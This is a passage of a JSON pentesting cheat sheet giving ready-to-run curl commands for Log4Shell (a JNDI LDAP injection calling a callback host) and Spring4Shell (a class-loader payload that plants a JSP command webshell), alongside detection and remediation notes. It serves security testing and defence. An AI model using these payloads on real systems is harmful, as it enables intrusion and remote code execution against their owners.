  {
    "id": "log4shell-test",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -H 'X-Api-Version: ${jndi:ldap://<callback>/a}' http://<target>/",
    "name": "Log4Shell Test (CVE-2021-44228)",
    "description": "Tests for Log4j RCE by injecting JNDI lookup in various headers.",
    "arguments": {
      "${jndi:ldap://...}": "Log4j JNDI lookup payload",
      "X-Api-Version": "Header likely to be logged"
    },
    "expected_output": "# If vulnerable: DNS/LDAP callback received at your server",
    "use_case": "Test for one of the most critical vulnerabilities ever \u2014 affects Java applications using Log4j.",
    "prerequisites": [
      "Java application",
      "Callback server (interactsh)"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "JNDI lookup strings in logs",
      "Outbound LDAP connections"
    ],
    "remediation": [
      "Update Log4j to 2.17+",
      "Set log4j2.formatMsgNoLookups=true"
    ],
    "common_mistakes": [
      "Not Java application",
      "Already patched"
    ],
    "alternatives": [
      "nuclei -t cves/2021/CVE-2021-44228",
      "log4j-scan"
    ],
    "references": [
      "https://www.lunasec.io/docs/blog/log4j-zero-day/"
    ],
    "tags": [
      "log4shell",
      "log4j",
      "jndi",
      "rce",
      "critical",
      "cve"
    ]
  },
  {
    "id": "spring4shell-test",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -X POST http://<target>/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'",
    "name": "Spring4Shell Test (CVE-2022-22965)",
    "description": "Tests for Spring Framework RCE via class loader manipulation.",
    "arguments": {
      "POST data": "ClassLoader manipulation payload"
    },
    "expected_output": "# If vulnerable: JSP webshell created on server",
    "use_case": "Test Spring Framework applications for critical RCE vulnerability.",
    "prerequisites": [
      "Spring Framework application",
      "JDK 9+",
      "Tomcat deployment"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "Unusual POST parameters",
      "ClassLoader manipulation in logs"
    ],
    "remediation": [
      "Update Spring Framework",
      "Use WAF rules"
    ],
    "common_mistakes": [
      "Not Spring/not Tomcat/patched"
    ],
    "alternatives": [
      "nuclei -t cves/2022/CVE-2022-22965"
    ],
    "references": [
      "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
    ],
    "tags": [
      "spring4shell",
      "spring",
      "rce",
      "cve",
      "java"
    ]
  },
